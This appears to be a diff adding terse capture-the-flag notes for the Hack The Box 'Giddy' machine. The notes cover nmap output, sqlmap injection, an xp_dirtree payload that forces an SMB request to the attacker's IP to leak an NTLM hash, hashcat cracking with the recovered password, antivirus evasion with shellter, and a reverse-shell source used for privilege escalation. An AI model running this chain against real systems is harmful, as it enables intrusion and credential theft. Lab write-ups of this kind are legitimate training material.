@@ -1,0 +1,86 @@
+# Recon
+## Nmap
+### comm tcp
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
+| Not valid before: 2018-06-16T21:28:55
+|_Not valid after:  2018-09-14T21:28:55
+|_ssl-date: 2020-06-24T05:33:59+00:00; +1m07s from scanner time.
+| tls-alpn:
+|   h2
+|_  http/1.1
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: GIDDY
+|   NetBIOS_Domain_Name: GIDDY
+|   NetBIOS_Computer_Name: GIDDY
+|   DNS_Domain_Name: Giddy
+|   DNS_Computer_Name: Giddy
+|   Product_Version: 10.0.14393
+|_  System_Time: 2020-06-24T05:33:46+00:00
+| ssl-cert: Subject: commonName=Giddy
+| Not valid before: 2020-06-23T05:28:00
+|_Not valid after:  2020-12-23T05:28:00
+|_ssl-date: 2020-06-24T05:33:59+00:00; +1m07s from scanner time.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+### all tcp
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+
+# Enum
+## 80
+RTFSC, cookie, get nothing.
+iis 10, no exp found.
+
+gobuster => found /remote
+/remote => windows server 2016, Windows PowerShell Web Access, and requires ssl
+=> need https
+
+go to https
+
+## 443
+The cert has CN: PowerShellWebAccessTestWebSite
+/remote => need user pass, computer name should be giddy (guess).
+/mvc => a blog
+
+tried admin:admin, nope, need to find cred.
+
+/mvc => a list of goods.
+/mvc/Product.aspx?ProductSubCategoryId=18 => maybe injection (?)
+/mvc/Search.aspx => maybe sql injection(?)
+
+sqlmap 'https://giddy.htb/mvc/Product.aspx?ProductSubCategoryId=18' --batch
+=> it is injectable.
+=> user giddy\\stacy
+
+(get hint) use the mssql-smb leaked NTLM hash.
+from payloadallthething =>  use master; exec xp_dirtree '\\10.10.15.XX\SHARE';--  => forged smb request
+
+hashcat -m 5600 --force Stacy::GIDDY:4141414141414141:c04bfe5f15c1b88eadcaf8c304744a7e:0101000000000000009e9004b94ad6011e8741d9fe3c5ab10000000001001000450063004d0058004700530043004600020010004c0051004500740046004a004400490003001000450063004d0058004700530043004600040010004c0051004500740046004a004400490007000800009e9004b94ad601060004000200000008003000300000000000000000000000003000002fc74327c7ae44e9b33997e174e8175f1d10243c9e0a916ef74c99aa9e3605f70a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003700000000000000000000000000 /usr/share/wordlists/rockyou.txt
+
+=> xNnWo6272k7x => use with user "giddy\\stacy" in powershell website => get foothold.
+
+# Priv Esc
+Cannot create new-object in this webshell.
+tried evil-winrm => got in but has the same create-object contrain.
+find a Documents/unifivideo => content is "stop", checked with `Get-Item -Path C:\Users\Stacy\documents\* -Stream *`, no dice.
+
+found its exploit https://www.exploit-db.com/exploits/43390, but not sure about the version. 
+Just tried it, AV checked during copy. Used shellter to by pass it. => but the returned shell doesn't have output.
+
+Get hint, we can use:
+Set-Location 'HKLM:\SYSTEM\CurrentControlSet\Services'
+Get-ChildItem .
+=> to get services.
+
+Use https://raw.githubusercontent.com/paranoidninja/ScriptDotSh-MalwareDevelopment/master/prometheus.cpp and replace names.
+=> root
